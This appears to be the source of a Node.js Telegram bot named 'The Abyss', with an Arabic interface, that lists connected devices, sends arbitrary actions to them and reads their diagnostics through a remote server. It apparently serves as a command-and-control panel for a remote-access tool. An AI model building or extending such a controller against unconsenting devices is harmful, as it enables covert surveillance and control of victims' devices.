const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');

const TOKEN = process.env.TELEGRAM_TOKEN || "YOUR_TELEGRAM_TOKEN";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";
const SERVER_URL = process.env.SERVER_URL || "YOUR_RENDER_URL";

const bot = new TelegramBot(TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `🕷️ مرحباً بك في The Abyss\n\nالأوامر المتاحة:\n/devices - عرض الأجهزة\n/cmd [deviceId] [action] - تنفيذ أمر\n/status [deviceId] - حالة الجهاز`);
});

bot.onText(/\/devices/, async (msg) => {
    try {
        const res = await fetch(`${SERVER_URL}/api/devices`);
        const data = await res.json();
        if (!data.devices || data.devices.length === 0) {
            bot.sendMessage(msg.chat.id, '❌ لا توجد أجهزة متصلة.');
            return;
        }
        let text = '📱 الأجهزة المتصلة:\n\n';
        data.devices.forEach(d => {
            text += `• ${d.model} (${d.id})\n  الحالة: ${d.status}\n\n`;
        });
        bot.sendMessage(msg.chat.id, text);
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ خطأ: ${e.message}`);
    }
});

bot.onText(/\/cmd (.+) (.+)/, async (msg, match) => {
    const deviceId = match[1];
    const action = match[2];
    try {
        const res = await fetch(`${SERVER_URL}/api/commands/${deviceId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, data: '' })
        });
        const data = await res.json();
        bot.sendMessage(msg.chat.id, data.ok ? `✅ تم إرسال الأمر: ${action}` : `❌ فشل`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ خطأ: ${e.message}`);
    }
});

bot.onText(/\/status (.+)/, async (msg, match) => {
    const deviceId = match[1];
    try {
        const res = await fetch(`${SERVER_URL}/api/diagnostics/${deviceId}`);
        const data = await res.json();
        bot.sendMessage(msg.chat.id, `📊 حالة ${deviceId}:\n${JSON.stringify(data, null, 2)}`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ خطأ: ${e.message}`);
    }
});

console.log('🕷️ The Abyss Bot is running...');